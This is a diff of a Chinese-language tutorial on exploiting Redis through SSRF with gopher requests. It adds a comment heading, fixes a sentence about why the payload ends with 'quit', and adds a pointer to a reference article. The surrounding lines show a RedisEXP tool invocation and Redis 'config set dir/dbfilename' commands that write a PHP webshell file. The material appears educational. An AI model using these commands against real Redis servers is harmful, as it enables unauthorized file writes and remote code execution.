@@ -53,6 +53,7 @@ RedisEXP_windows_amd64.exe -m gopher -r 127.0.0.1 -p 6379 -f getshell
 ```
 
 ```txt
+# getshell内容
 config set dir /tmp
 config set dbfilename shell.php
 set 'webshell' '<?php phpinfo();?>'
@@ -89,7 +90,7 @@ echo $response; // 输出响应内容
 
 ![image-20241016141503569](./images/image-20241016141503569.png)
 
-2. 注意到上面的payload中的quit命令，当我们直接通过命令行发起gopher请求时就类似于使用telnet发起了一个tcp请求，要中断这个请求，要么客户端Ctrl+C，要么输入quit命令让服务端中断。在通过ssrf攻击redis时，如果tcp连接一直不断开，那么请求结不返回果将会一直，所以我们需要使用quit命令主动让redis-server断开连接。
+2. 注意到上面的payload中的quit命令，当我们直接通过命令行发起gopher请求时就类似于使用telnet发起了一个tcp请求，要中断这个请求，要么客户端Ctrl+C，要么输入quit命令让服务端中断。在通过ssrf攻击redis时，如果tcp连接一直不断开，那么请求结果将会一直不返回，所以我们需要使用quit命令主动让redis-server断开连接。
 
    ![image-20241016141639224](./images/image-20241016141639224.png)
 
@@ -124,7 +125,7 @@ config set dbfilename phpinfo.php
 save
 ```
 
-这里一般写入长度较短的小马没啥问题，要是写入的webshell长度过长，可能会遇到一些问题：
+这里一般写入长度较短的小马没啥问题，要是写入的webshell长度过长，可能会遇到一些问题，详情参考文章：
 
 [原创 Paper | Windows 与 Java 环境下的 Redis 利用分析 (qq.com)](https://mp.weixin.qq.com/s/f7hPOoSSiRJpyMK51_Vxrw)
 
